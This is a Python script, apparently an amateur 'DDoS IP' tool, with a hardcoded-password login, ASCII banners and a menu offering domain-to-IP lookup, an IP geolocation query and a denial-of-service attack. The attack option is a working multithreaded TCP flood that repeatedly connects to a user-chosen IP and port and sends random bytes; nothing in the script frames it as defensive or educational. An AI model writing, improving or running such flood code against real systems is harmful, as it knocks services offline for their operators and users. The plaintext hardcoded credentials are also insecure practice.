import socket
import random
import os
import time
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass
from ast import Num
import code
import requests
import socket
from multiprocessing.connection import wait
from operator import contains
from platform import system
import random
from socket import timeout
import os
import sys
import time
from time import sleep
import math
import threading

time.sleep(1)
os.system("clear")

os.system("figlet DDoS IP")
time.sleep(3)

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.045)

type("""Tools DDos Methods IP tool""")
time.sleep(3)
os.system("clear")
print()


number_list = ['1', '2', '3', '4']
num2208 = '0'
wwyd = "What do you want to do?"
login = '0'
msg = "Booting up..."
email_list = ['Philipp', 'ichbin', 'renner']
pass1 = "Philipp2205"
pass2 = "Ichbin4563"
pass3 = "renner37"
notALL = "Your not allowed to youse this programm. QUIT in 4 Seconds."

os.system('color 2')
print(
    
    "▒█▀▀█ █░░█ █░░█ ▀▀█▀▀ █░░█ █▀▀█ █▀▀▄ ▄█░\n▒█▄▄█ █▀▀█ █▄▄█ ░░█░░ █▀▀█ █░░█ █░░█ ░█░\n▒█░░░ ▀░░▀ ▄▄▄█ ░░▀░░ ▀░░▀ ▀▀▀▀ ▀░░▀ ▄█▄"
)


print(msg)
time.sleep(1)


email = input("What is your Username? : ")
contains_email = email in email_list

if contains_email == True:

    Password = input("What is your Password? : ")
    
    if email == 'Philipp':
        
        if Password == pass1:
            
            print("You are now logged in.")
            login = '1'
                    
        else:
        
            print(notALL)
            time.sleep(4)
            quit()

        
    if email == 'ichbin':
        
        if Password == pass2:
            
            print("You are now logged in.")
            login = '1'
            
        else:
        
            print(notALL)
            time.sleep(4)
            quit()

            
    if email == 'renner':
        
        if Password == pass3:
            
            print("You are now logged in.")
            login = '1'
            
        else:
             
            print(notALL)
            time.sleep(4)
            quit()

else:
    
    print(notALL)
    time.sleep(4)
    quit()


if login == '1':
    
    os.system('cls')
    print(wwyd)
    print("\n\n[1] Ip of Domain \n[2] IP DDOS \n[3] IP Localization \n[4] QUIT")
    num1 = input("\nPaste your Number: ")
    
    if num1 == '1':
        
        os.system('cls')
        print("\n\n\n▀█▀ ▒█▀▀█ 　 ▒█▀▀▀█ ▒█▀▀▀ 　 ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▄▀█ ░█▀▀█ ▀█▀ ▒█▄░▒█\n▒█░ ▒█▄▄█ 　 ▒█░░▒█ ▒█▀▀▀ 　 ▒█░▒█ ▒█░░▒█ ▒█▒█▒█ ▒█▄▄█ ▒█░ ▒█▒█▒█\n▄█▄ ▒█░░░ 　 ▒█▄▄▄█ ▒█░░░ 　 ▒█▄▄▀ ▒█▄▄▄█ ▒█░░▒█ ▒█░▒█ ▄█▄ ▒█░░▀█ ")
    	
        
        s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        host = input("\nWhat Domain should we youse? : ")
        
        
        ip = socket.gethostbyname(host)
        
        print("\nDie IP Adresse lautet: ",ip)
        
        print("Auto close in 10 Seconds...")
        time.sleep(10)
            

              
    else:
        
        if num1 == '2':
            os.system('cls')
            print("\n\n\n▀█▀ ▒█▀▀█ 　 ▒█▀▀▄ ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▀▀█\n▒█░ ▒█▄▄█ 　 ▒█░▒█ ▒█░▒█ ▒█░░▒█ ░▀▀▀▄▄\n▄█▄ ▒█░░░ 　 ▒█▄▄▀ ▒█▄▄▀ ▒█▄▄▄█ ▒█▄▄▄█")
            
            ip = str(input('[*][Ip Adress]: => '))
            port = int(input('[*][Port]: => '))
            pack = int(input('[*][Packs]: => '))
            thread = int(input('[*][Threads]: => '))
            
            def start():
                hh = random._urandom(10)
                xx = int(0)
                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(hh)
                        for i in range(pack):
                            s.send(hh)
                        xx += 1
                        print('Attacking'+ip+' | Sent:'+str(xx))
                    except:
                        s.close()
                        print('Done')
            
            for x in range(thread):
                thred = threading.Thread(target=start)
                thred.start()
                
            
            
        else:
                
            if num1 == '3':
                
                print("\n\n\n▒█▀▀▀ █▀▄▀█ █▀▀█ ░▀░ █░░\n▒█▀▀▀ █░▀░█ █▄▄█ ▀█▀ █░░\n▒█▄▄▄ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀")
                
                response = requests.get("http://ip-api.com/json/24.48.0.1")
                print(response)



            else:
                
            
                if num1 == '4':
                    
                    print("Closing in 2 Seconds")
                    time.sleep(2)
                    quit()
                
                else:
                    
                    print("Your Number is invalid")
                
#print('Atacando porta 💥')
